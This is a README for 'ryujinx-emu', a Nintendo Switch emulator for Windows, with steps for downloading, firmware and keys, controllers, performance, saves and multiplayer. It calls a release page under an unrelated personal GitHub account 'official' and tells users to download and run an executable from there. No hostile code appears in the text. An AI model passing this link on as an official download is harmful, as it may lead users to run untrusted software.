# 🎮 ryujinx-emu - Play Nintendo Switch games on Windows

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Allergic-gallimaufry66/ryujinx-emu/releases)

ryujinx-emu lets you play Nintendo Switch games on your personal computer. This software turns your Windows machine into a gaming console. It uses advanced technology to mimic the original hardware, which allows for smooth gameplay and high-quality graphics. You get access to your library of games directly on your monitor. This project stays open-source to ensure quality and continuous improvement.

## 📥 How to download the software

Follow these steps to get the emulator on your computer.

1. Go to the [official release page](https://github.com/Allergic-gallimaufry66/ryujinx-emu/releases).
2. Look for the section labeled Latest.
3. Select the file ending in .zip for your Windows system.
4. Save the file to a folder you can find easily, such as your Downloads folder.
5. Right-click the downloaded folder and select Extract All.
6. Open the extracted folder and double-click the main executable file to start the program.

## ⚙️ Setting up your system

The emulator requires a few extra files to work. You must provide your own firmware files and production keys. 

1. Launch the application for the first time.
2. The software will show an error message. This is normal.
3. Open the folder where you installed the program.
4. Locate the folder labeled system. 
5. Place your prod.keys file into this directory.
6. To install the firmware, open the emulator and go to the top menu.
7. Select Tools, then choose Install Firmware from Directory or ZIP.
8. Pick the folder that contains your firmware files.
9. Wait for the confirmation message to appear.

## 🕹️ Configuring your controller

You can use most modern gamepads with this software. The emulator recognizes devices from Xbox, PlayStation, and other standard controllers.

1. Connect your controller to your computer via USB or Bluetooth.
2. Open the emulator settings menu.
3. Select the Input tab.
4. Click the Configure button under the Player 1 section.
5. Match the buttons on your controller to the on-screen display.
6. Save your settings and return to the main window.

## 🖥️ Optimizing performance

The emulator provides several tools to help your games look and run well. 

- Graphics backend: You can switch between Vulkan and OpenGL in the graphics settings. Vulkan usually provides better speed on modern systems.
- Resolution scaling: You can increase the resolution to make games look sharp on high-definition monitors.
- Shader cache: The program builds a shader cache the first time you play a game. The game might stutter briefly while this happens, but performance improves as you keep playing.

## 📂 Managing your game library

The emulator keeps your games organized in a clear list.

1. Create a folder on your hard drive where you store your game files.
2. Go to the Settings menu in the emulator.
3. Click the General tab.
4. Add your game directory path to the list.
5. The emulator will scan the folder and show your games on the home screen.

## ☁️ Using game saves

You can manage your game progress through the Save Manager feature.

1. Right-click any game in your list.
2. Choose Open Save Data Location.
3. This folder contains the files for your progress.
4. You can back up these files to a different drive to keep them safe.
5. To restore a save, simply copy your backup files back into this same folder.

## 🌐 Local wireless multiplayer

You can play with friends who also use this software. This feature simulates a local wireless connection.

1. Go to the Settings menu.
2. Select the Network tab.
3. Enable the Local Wireless option.
4. Ensure all players use the same network settings.
5. Start your game and head to the multiplayer lobby to connect with others.

## 🛠️ Frequently asked questions

What are the system requirements?
We suggest a computer with at least 8GB of RAM and a dedicated graphics card from NVIDIA or AMD for the best experience.

Does this support Linux?
Yes, the source code compiles on Linux, but this guide focuses on Windows support.

What if a game runs slow?
Check that you have the latest graphics drivers installed for your computer. Adjusting the graphics settings to a lower resolution can also help improve the frame rate.

Can I use Steam Deck?
The software works on Steam Deck, but you require the Linux version of the build.

Where can I report bugs?
If you encounter a specific issue, visit the repository page and open a new ticket in the Issues section. Provide as much detail as possible about the error to help with the fix.